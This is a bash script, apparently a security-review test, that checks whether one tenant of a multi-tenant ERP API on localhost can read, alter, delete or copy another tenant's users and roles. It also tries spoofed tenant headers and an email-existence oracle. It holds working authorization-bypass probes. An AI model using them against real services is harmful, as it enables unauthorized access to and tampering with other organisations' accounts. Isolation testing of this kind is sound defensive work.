#!/usr/bin/env bash
# Tenant A (alnoor) attacks tenant B (gulfsteel) through the API. B's ids are read as B's admin first.
B=${BASE:-http://localhost:20350}
H=(-H 'Content-Type: application/json' -H 'X-Erp-Request: 1')
JA=/tmp/critic-r2-a.txt; JB=/tmp/critic-r2-b.txt; rm -f $JA $JB
curl -s -c $JA "${H[@]}" -X POST $B/api/auth/sign-in -d '{"email":"admin@alnoor.example","password":"Demo-Pass-2026"}' -o /dev/null -w "sign-in A admin: %{http_code}\n"
curl -s -c $JB "${H[@]}" -X POST $B/api/auth/sign-in -d '{"email":"admin@gulfsteel.example","password":"Demo-Pass-2026"}' -o /dev/null -w "sign-in B admin: %{http_code}\n"
BSESS=$(curl -s -b $JB $B/api/auth/session)
BU=$(echo "$BSESS" | python3 -c 'import json,sys;print(json.load(sys.stdin)["user"]["id"])')
BT=$(echo "$BSESS" | python3 -c 'import json,sys;d=json.load(sys.stdin);t=d.get("tenant") or {};print(t.get("id",""))')
ROLES=$(curl -s -b $JB "$B/api/identity/roles?take=50")
BR=$(echo "$ROLES" | python3 -c 'import json,sys;print([r["id"] for r in json.load(sys.stdin)["items"] if r["isSystem"]][0])')
BRO=$(echo "$ROLES" | python3 -c 'import json,sys;print([r["id"] for r in json.load(sys.stdin)["items"] if not r["isSystem"]][0])')
# A B user who never signed in (for delete): create one as B admin
BNEW=$(curl -s -b $JB "${H[@]}" -X POST $B/api/identity/users -d '{"email":"victim.never@gulfsteel.example","displayName":"Victim Never","language":"en","roleIds":[]}' | python3 -c 'import json,sys;print(json.load(sys.stdin).get("id",""))')
[[ -z "$BNEW" ]] && BNEW=$(curl -s -b $JB "$B/api/identity/users?search=victim.never" | python3 -c 'import json,sys;print(json.load(sys.stdin)["items"][0]["id"])')
echo "B admin=$BU B tenant=$BT B admin role=$BR B other role=$BRO B never-signed-in user=$BNEW"
curl -s -b $JB "$B/api/auth/session" -o /dev/null
PAT="gulfsteel|$BU|$BR|$BRO|$BNEW"; [[ -n "$BT" ]] && PAT="$PAT|$BT"
req() { local m=$1 p=$2 d=${3:-}; shift 3 2>/dev/null; local out; if [[ -n "$d" ]]; then out=$(curl -s -b $JA "${H[@]}" "$@" -X $m "$B$p" -d "$d" -w " [%{http_code}]"); else out=$(curl -s -b $JA "${H[@]}" "$@" -X $m "$B$p" -w " [%{http_code}]"); fi; local leak=""; echo "$out" | grep -qiE "$PAT" && leak="  <-- B VALUE IN RESPONSE"; echo "$m $p -> ${out: -5}$leak"; }
# B reads its own records first (warms anything keyed by id)
for p in /api/identity/users/$BU /api/identity/users/$BU/access /api/identity/users/$BU/sign-ins /api/identity/roles/$BR /api/identity/users/$BNEW; do curl -s -b $JB "$B$p" -o /dev/null; done
req GET /api/identity/users/$BU
req GET /api/identity/users/$BU/access
req GET /api/identity/users/$BU/sign-ins
req GET /api/identity/users/$BNEW
req PUT /api/identity/users/$BU '{"displayName":"pwned","language":"en","isActive":false,"roleIds":[],"version":1}'
req PUT /api/identity/users/$BNEW '{"displayName":"pwned","language":"en","isActive":true,"roleIds":[],"version":1,"email":"stolen@alnoor.example"}'
req POST /api/identity/users/$BU/password '{}'
req POST /api/identity/users/$BU/unblock ''
req POST /api/identity/users/$BU/sessions/revoke ''
req DELETE /api/identity/users/$BNEW
req GET /api/identity/roles/$BR
req PUT /api/identity/roles/$BRO '{"nameEn":"x","nameAr":"x","permissions":[],"version":1}'
req DELETE /api/identity/roles/$BRO
req POST /api/identity/roles/$BR/copy '{"nameEn":"Stolen admin","nameAr":"x"}'
req POST /api/identity/users '{"email":"critic.r2x1@alnoor.example","displayName":"X","language":"en","roleIds":["'$BRO'"]}'
req GET "/api/identity/users?search=gulfsteel"
req GET "/api/identity/users?search=admin%40gulfsteel.example"
req GET "/api/identity/users?search=victim"
req GET "/api/identity/users?filter=id%20eq%20$BU"
req GET "/api/identity/users?filter=roleIds%20eq%20$BR"
req GET "/api/identity/roles?search=Stolen"
req GET "/api/identity/users?search=x&tenantId=$BT"
req GET /api/identity/users/$BU '' -H "X-Tenant-Id: $BT" -H "X-Tenant: gulfsteel" -H "X-Workspace: gulfsteel"
req GET /api/tenancy/tenant '' -H "X-Tenant-Id: $BT"
req GET "/api/tenancy/tenant?tenantId=$BT"
echo "-- e-mail existence oracle across workspaces (both must be 201):"
req POST /api/identity/users '{"email":"viewer@gulfsteel.example","displayName":"Same address","language":"en","password":"Critic-Pass-2026x","mustChangePassword":false,"roleIds":[]}'
req POST /api/identity/users '{"email":"nobody.critic.r2@gulfsteel.example","displayName":"Control","language":"en","password":"Critic-Pass-2026x","mustChangePassword":false,"roleIds":[]}'
echo "-- change an A user's e-mail to B's admin address (must succeed, says nothing about B):"
AID=$(curl -s -b $JA "$B/api/identity/users?search=nobody.critic.r2" | python3 -c 'import json,sys;i=json.load(sys.stdin)["items"][0];print(i["id"], i["version"])')
set -- $AID
req PUT /api/identity/users/$1 '{"displayName":"Control","language":"en","isActive":true,"roleIds":[],"version":'$2',"email":"admin@gulfsteel.example"}'
echo "-- sign-in with A's credentials naming workspace B:"
curl -s "${H[@]}" -X POST $B/api/auth/sign-in -d '{"email":"admin@alnoor.example","password":"Demo-Pass-2026","workspace":"gulfsteel"}' -w " [%{http_code}]\n" | grep -o '"tenant":{[^}]*}\|\[[0-9]*\]$'
echo "-- same address in both workspaces, A's password (which workspace?):"
curl -s "${H[@]}" -X POST $B/api/auth/sign-in -d '{"email":"viewer@gulfsteel.example","password":"Critic-Pass-2026x"}' -w " [%{http_code}]\n" | grep -o '"tenant":{[^}]*}\|"workspaces":\[[^]]*\]\|\[[0-9]*\]$'
curl -s "${H[@]}" -X POST $B/api/auth/sign-in -d '{"email":"viewer@gulfsteel.example","password":"Demo-Pass-2026"}' -w " [%{http_code}]\n" | grep -o '"tenant":{[^}]*}\|"workspaces":\[[^]]*\]\|\[[0-9]*\]$'
echo "-- B's records after the attack:"
curl -s -b $JB "$B/api/identity/users/$BU" | head -c 300; echo
curl -s -b $JB "$B/api/identity/users/$BNEW" -w " [%{http_code}]" | head -c 300; echo
curl -s -b $JB "$B/api/identity/roles/$BRO" -w " [%{http_code}]" | head -c 200; echo
curl -s -b $JB "$B/api/auth/session" | head -c 120; echo
